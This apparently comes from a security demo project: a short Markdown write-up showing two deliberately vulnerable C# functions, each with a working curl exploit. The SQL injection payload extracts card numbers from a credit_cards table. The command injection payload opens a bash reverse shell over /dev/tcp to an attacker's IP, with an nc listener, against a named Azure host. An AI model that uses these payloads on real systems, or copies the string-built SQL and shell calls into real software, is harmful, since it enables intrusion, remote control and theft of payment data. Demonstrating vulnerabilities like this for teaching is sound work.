## SQL Injection vulnerability
```cs
private async Task<decimal> GetStokPriceFromLocalCache(string symbol)
{
    string cs = "Data Source=cache.sqlite";
    string stm = "SELECT price FROM open_stock_price WHERE symbol='" + symbol + "'";
    using var con = new SQLiteConnection(cs);
    con.Open();
    using var cmd = new SQLiteCommand(stm, con);
    var price = cmd.ExecuteScalar();
    if (price != null)
        return await Task.FromResult((decimal)price);

    return 0;
}
```  
*Exploit*:
```sh
# curl -X GET "https://fn-securitydevcontaineir-aa.azurewebsites.net/api/stock-price/symbol/asdfasfd/close?symbol=xxx' union select card_num as price from credit_cards -- " -H  "accept: text/plain"

curl -X GET "http://localhost:7071/api/stock-price/symbol/asdfasfd/close?symbol=xxx%27%20union%20select%20card_num%20as%20price%20from%20credit_cards%20--%20" -H  "accept: text/plain"
```

## Command Injection vulnerability
```cs
private void SendToSysLogs(string msg)
{
    var p = new Process();
    p.StartInfo.FileName = "/bin/bash";
    p.StartInfo.Arguments = $"-c \"logger {msg}\"";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.CreateNoWindow = true;
    p.Start();
}
```  
*Exploit*:
```sh
# Remote listener (sudo nc -l <your port>) on your publicly accessible IP address
# curl -X GET "https://fn-securitydevcontaineir-aa.azurewebsites.net/api/stock-price/symbol/test/open?symbol=test & bash &>/dev/tcp/<your ip address>/<your port> <&1" -H  "accept: text/plain"

curl -X GET "https://fn-securitydevcontaineir-aa.azurewebsites.net/api/stock-price/symbol/test/open?symbol=test%20%26%20bash%20%26%3E%2Fdev%2Ftcp%2Fxx.xx.xx.xx%2FXXX%20%3C%261" -H  "accept: text/plain"
```